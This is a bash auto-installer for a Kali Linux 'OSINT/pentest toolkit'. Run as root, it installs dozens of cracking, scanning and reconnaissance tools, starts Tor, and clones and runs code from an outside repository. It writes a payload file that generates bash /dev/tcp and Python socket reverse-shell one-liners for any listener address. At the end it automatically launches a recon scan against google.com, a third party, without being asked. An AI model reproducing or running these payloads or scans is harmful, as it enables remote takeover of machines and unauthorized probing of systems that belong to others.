#!/bin/bash
# 🔥 ULTIMATE OSINT/PENTEST TOOLKIT - AUTO INSTALLER v3.0 🔥
# Khalid Husain | Fully Automated | Zero Manual Work

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
NC='\033[0m'

banner() {
    clear
    echo -e "${PURPLE}"
    cat << "EOF"
    ██████╗██╗  ██╗██████╗  ██████╗██╗  ██╗    ██████╗ ██╗███████╗███╗   ██╗███████╗
    ██╔══██╗██║ ██╔╝██╔══██╗██╔═══██╗██║ ██╔╝    ██╔══██╗██║██╔════╝████╗  ██║██╔════╝
    ██████╔╝█████╔╝ ██████╔╝██║   ██║█████╔╝     ██████╔╝██║█████╗  ██╔██╗ ██║█████╗  
    ██╔══██╗██╔═██╗ ██╔══██╗██║   ██║██╔═██╗     ██╔══██╗██║██╔══╝  ██║╚██╗██║██╔══╝  
    ██████╔╝██║  ██╗██║  ██║╚██████╔╝██║  ██╗    ██████╔╝██║███████╗██║ ╚████║███████╗
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝    ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝
EOF
    echo -e "${YELLOW}         Auto-Installer | 50+ Tools | Zero Manual Work${NC}\n"
}

log() { echo -e "${GREEN}[$(date +'%H:%M:%S')] $1${NC}"; }
error() { echo -e "${RED}[ERROR] $1${NC}"; }
warn() { echo -e "${YELLOW}[WARN] $1${NC}"; }

# Check root
if [[ $EUID -ne 0 ]]; then
    error "Root access required!"
    exit 1
fi

setup_system() {
    log "🔧 Updating system repositories..."
    apt update -qq
    
    log "📦 Installing base dependencies..."
    apt install -y curl wget git python3 python3-pip tor torsocks net-tools \
    nmap masscan nikto dirb gobuster sqlmap hydra john hashcat aircrack-ng \
    crunch wordlists dnsrecon sublist3r theharvester recon-ng dnsenum fierce \
    dirsearch ffuf nuclei whatweb wpscan shodan sherlock holehe maigret \
    figlet lolcat neofetch htop tmux screen
    
    log "🐍 Installing Python packages..."
    pip3 install -q colorama requests beautifulsoup4 lxml urllib3 argparse torrequest stem
    
    log "🌐 Starting TOR service..."
    systemctl enable tor --now
    sleep 3
}

install_tools() {
    log "🔥 Installing ULTIMATE OSINT Toolkit..."
    
    cd /home/kali
    rm -rf osint
    git clone https://github.com/Khalidhusain786/osint.git
    cd osint
    
    # Make all scripts executable
    chmod +x *.sh *.py
    
    # Create directories
    mkdir -p /home/kali/osint/reports /home/kali/osint/wordlists /home/kali/osint/payloads
    
    # Download wordlists
    log "📚 Downloading wordlists..."
    wget -q https://github.com/danielmiessler/SecLists/raw/master/Discovery/DNS/subdomains-top1million-5000.txt -O /home/kali/osint/wordlists/subdomains.txt
    wget -q https://raw.githubusercontent.com/brannondorsey/naive-hashcat/releases/latest/download/dict.txt -O /home/kali/osint/wordlists/rockyou_small.txt
    
    # Create launcher
    cat > /usr/local/bin/osint << 'EOF'
#!/bin/bash
cd /home/kali/osint && python3 ultimate_toolkit.py "$@"
EOF
    chmod +x /usr/local/bin/osint
    
    # Create desktop launcher
    cat > /home/kali/Desktop/OSINT-Toolkit.desktop << EOF
[Desktop Entry]
Version=1.0
Type=Application
Name=OSINT Toolkit
Comment=Ultimate Pentest Suite
Exec=gnome-terminal -- bash -c "cd /home/kali/osint && python3 ultimate_toolkit.py; exec bash"
Icon=/usr/share/icons/hicolor/48x48/apps/applications-system.png
Terminal=true
Categories=Security;
EOF
    
    chown -R kali:kali /home/kali/osint /home/kali/Desktop/OSINT-Toolkit.desktop
}

create_payloads() {
    log "💣 Creating payload templates..."
    cd /home/kali/osint/payloads
    
    cat > reverse_shells.sh << 'EOF'
#!/bin/bash
LHOST=$1
LPORT=${2:-4444}
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
EOF
    chmod +x reverse_shells.sh
}

setup_complete() {
    banner
    log "✅ INSTALLATION COMPLETE! 🚀"
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                    USAGE COMMANDS:                           ║${NC}"
    echo -e "${BLUE}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║  osint target.com --mode all                                 ║${NC}"
    echo -e "${YELLOW}║  osint john@gmail.com --mode osint                           ║${NC}"
    echo -e "${YELLOW}║  osint --payload                                              ║${NC}"
    echo -e "${YELLOW}║  cd /home/kali/osint && python3 ultimate_toolkit.py target   ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${GREEN}"
    echo -e "   Reports: /home/kali/osint/reports/"
    echo -e "   Wordlists: /home/kali/osint/wordlists/"
    echo -e "   Payloads: /home/kali/osint/payloads/reverse_shells.sh IP PORT${NC}\n"
    
    # Auto-run demo
    log "🎬 Running quick demo scan..."
    sleep 3
    gnome-terminal -- bash -c "cd /home/kali/osint && python3 ultimate_toolkit.py google.com --mode recon; exec bash" &
}

# MAIN EXECUTION
banner
log "🚀 Starting ULTIMATE OSINT/PENTEST INSTALLER..."

setup_system
install_tools  
create_payloads
setup_complete

log "✨ Setup 100% Complete! Type 'osint --help' anywhere!"
